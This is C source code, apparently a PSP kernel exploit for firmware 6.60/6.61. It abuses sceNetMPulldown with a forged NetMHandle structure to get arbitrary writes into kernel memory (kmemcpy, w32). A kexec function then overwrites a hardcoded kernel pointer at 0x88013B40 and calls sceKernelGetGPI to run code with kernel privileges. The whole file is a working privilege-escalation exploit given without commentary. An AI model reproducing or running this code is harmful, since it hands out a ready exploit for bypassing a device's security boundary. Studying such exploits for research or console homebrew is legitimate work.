#include <pspkernel.h>
#include <pspctrl.h>
#include <psputility.h>

#include <stdio.h>
#include <string.h>

#pragma pack(push, 1)
typedef struct NetMHandle
{
	struct  NetMHandle *next;
	u32 field_4;
	void *src;
	u32 size;
	u16 field_10;
	u16 flags;
	u32 field_14;
	u32 field_18;
	struct NetMHandle *NetMParam_if_flag2;
	u32 field_20;
	u32 field_24;
	u32 field_28;
	u32 field_2C;
	u32 buffer;
	u32 field_34;
	u32 field_38;
	u32 buffer_size;
	u32 field_40;
	struct NetMHandle *NetMParam_if_flag1;
	struct NetMHandle *NetMParam_unk2;
	u32 field_4C;
	u32 field_50;
	u32 field_54;
	u32 field_58;
	u32 field_5C;
	u32 field_60;
	u32 field_64;
	u32 field_68;
	u32 field_6C;
	u32 field_70;
	u32 field_74;
	u32 field_78;
	u32 field_7C;
	u32 field_80;
	u32 field_84;
	u32 field_88;
	u32 field_8C;
	u32 field_90;
	u32 field_94;
	u32 field_98;
	u32 field_9C;
	u32 field_A0;
	u32 field_A4;
	u32 field_A8;
	u32 field_AC;
	u32 field_B0;
	u32 field_B4;
	u32 field_B8;
	u32 field_BC;
	u32 field_C0;
	u32 field_C4;
	u32 field_C8;
	u32 field_CC;
	u32 field_D0;
	u32 field_D4;
	u32 field_D8;
	u32 field_DC;
	u32 field_E0;
	u32 field_E4;
	u32 field_E8;
	u32 field_EC;
	u32 field_F0;
	u32 field_F4;
	u32 field_F8;
	u32 field_FC;
} NetMHandle;
#pragma pack(pop)

NetMHandle *sceNetMPulldown(NetMHandle *handle, int offset, int len, void *dest);

// only userspace -> userspace & userspace -> kernelspace
void kmemcpy(void *dest, void *src, int size)
{
	sceUtilityLoadNetModule(1);
	
	NetMHandle next_handle;
	memset(&next_handle, 0, sizeof(NetMHandle));
	next_handle.src = src;
	next_handle.size = size;

	NetMHandle handle;
	memset(&handle, 0, sizeof(NetMHandle));
	handle.next = &next_handle;
	handle.size = 1;
	handle.flags = 1;
	handle.NetMParam_if_flag1 = &handle;
	handle.src = (void *)((u32) dest - handle.size);
	handle.buffer = (u32) dest;
	handle.buffer_size = size;
	
	sceNetMPulldown(&handle, 0, handle.size + size, NULL);
	
	sceUtilityUnloadModule(1);
	
	sceKernelDcacheWritebackInvalidateAll();
	sceKernelIcacheInvalidateAll();
}

void w32(u32 val, void *dest)
{
	kmemcpy(dest, &val, 4);
}

// 6.60 / 6.61
extern int sceKernelGetGPI();
void kexec(void *func)
{
	w32((u32) func | 0x80000000, (void *) 0x88013B40);
	sceKernelGetGPI();
	w32(0, (void *) 0x88013B40);
}
